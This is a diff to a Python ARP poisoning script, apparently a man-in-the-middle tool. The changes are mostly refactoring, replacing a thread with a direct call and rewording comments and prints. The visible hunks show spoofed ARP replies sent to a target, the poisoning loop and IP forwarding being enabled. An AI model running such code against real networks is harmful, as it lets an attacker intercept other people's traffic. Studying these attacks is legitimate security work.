@@ -1,7 +1,6 @@
 import os
 import signal
 import sys
-import threading
 import time
 import socket
 import binascii
@@ -11,7 +10,7 @@ import struct
 import argparse
 
 
-# Get cli arguments
+# Get script arguments
 def get_arguments():
     parser = argparse.ArgumentParser()
     parser.add_argument("-t", "--target", help="Specify target ip")
@@ -94,7 +93,7 @@ def send_arp_packet(op, dest_ip, dest_mac, sender_ip, sender_mac, count=1):
 
         packet = ethernet_header + arp_addr
 
-        print("%s is at %s" % (socket.inet_ntoa(target_ip), format_mac(local_mac)))
+        print("arp reply %s is-at %s" % (socket.inet_ntoa(sender_ip), format_mac(sender_mac)))
         raw.send(packet)
 
 
@@ -127,6 +126,7 @@ def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
 
             # Send spoofed address to the target
             send_arp_packet(2, target_ip, target_mac, gateway_ip, local_mac)
+
             time.sleep(2)
     except KeyboardInterrupt:
         print("[*] Stopped ARP poison attack. Restoring network")
@@ -142,7 +142,7 @@ print(f"[*] Target IP address: {target_ip_str} \n")
 # Enable IP Forwarding on ubuntu
 os.system("sysctl -w net.ipv4.ip_forward=1")
 
-
+# Binary gateway and target IP
 gateway_ip = socket.inet_aton(gateway_ip_str)
 target_ip = socket.inet_aton(target_ip_str)
 
@@ -159,11 +159,10 @@ if target_mac is None:
     sys.exit(0)
 
 
-print(f"[*] Local MAC address: {get_local_mac('eth0')}")
+print(f"\n[*] Local MAC address: {get_local_mac('eth0')}")
 print(f"[*] Gateway MAC address: {format_mac(gateway_mac)}")
 print(f"[*] Target MAC address: {format_mac(target_mac)} \n")
 
 
-# ARP poison thread
-poison_thread = threading.Thread(target=arp_poison, args=(gateway_ip, gateway_mac, target_ip, target_mac))
-poison_thread.start()
+# Start ARP poison
+arp_poison(gateway_ip, gateway_mac, target_ip, target_mac)
